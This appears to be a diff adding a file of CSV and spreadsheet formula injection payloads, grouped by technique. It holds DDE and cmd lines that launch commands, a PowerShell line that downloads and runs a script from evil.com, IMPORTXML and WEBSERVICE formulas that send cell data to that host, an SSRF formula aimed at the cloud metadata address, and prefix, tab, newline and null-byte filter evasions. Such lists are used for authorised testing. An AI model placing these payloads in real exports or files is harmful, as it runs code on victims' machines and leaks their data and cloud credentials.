@@ -1,0 +1,47 @@
+# ============================================================
+# CSV Injection — Payloads (Formula Injection / DDE)
+# ============================================================
+
+# ---- Formula Injection (Excel / Google Sheets) ----
+=1+2
+=SUM(1+1)
+=2+5+cmd|' /C calc'!A0
+=cmd|'/C calc'!A0
+=cmd|' /C powershell IEX(New-Object System.Net.WebClient).DownloadString("https://evil.com/shell.ps1")'!A0
+=HYPERLINK("https://evil.com","Click Here")
+=IMPORTXML(CONCAT("https://evil.com/?x=",A1),"//a")
+=IMPORTDATA("https://evil.com/?data=1")
+=IMPORTFEED("https://evil.com/rss")
+=WEBSERVICE("https://evil.com/?steal=1")
+
+# ---- DDE (Dynamic Data Exchange) ----
+=DDE("cmd","/C whoami","result")
+=DDE("cmd", "/C calc", ".")
+DDE("cmd","/C powershell -enc BASE64PAYLOAD",".")
+
+# ---- Pipe in Data ----
+|=1+2
+|cmd|' /C calc'!A0
+
+# ---- Tab-based Escape ----
+	=cmd|' /C calc'!A0
+
+# ---- Prefixed Formulas ----
++=1+2
+-=1+2
+@=1+2
+@SUM(1+1)*cmd|' /C calc'!A0
+
+# ---- Newline Injection ----
+"\n=cmd|'/C calc'!A0"
+"\r\n=cmd|'/C calc'!A0"
+
+# ---- SSRF via IMPORTXML ----
+=IMPORTXML(CONCAT("https://evil.com/?x=",A2:A10),"//a")
+=IMPORTXML("https://169.254.169.254/latest/meta-data/","//text()")
+
+# ---- Macro Triggering ----
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!'A0'
+
+# ---- Null Byte Prefix ----
+%00=cmd|' /C calc'!A0
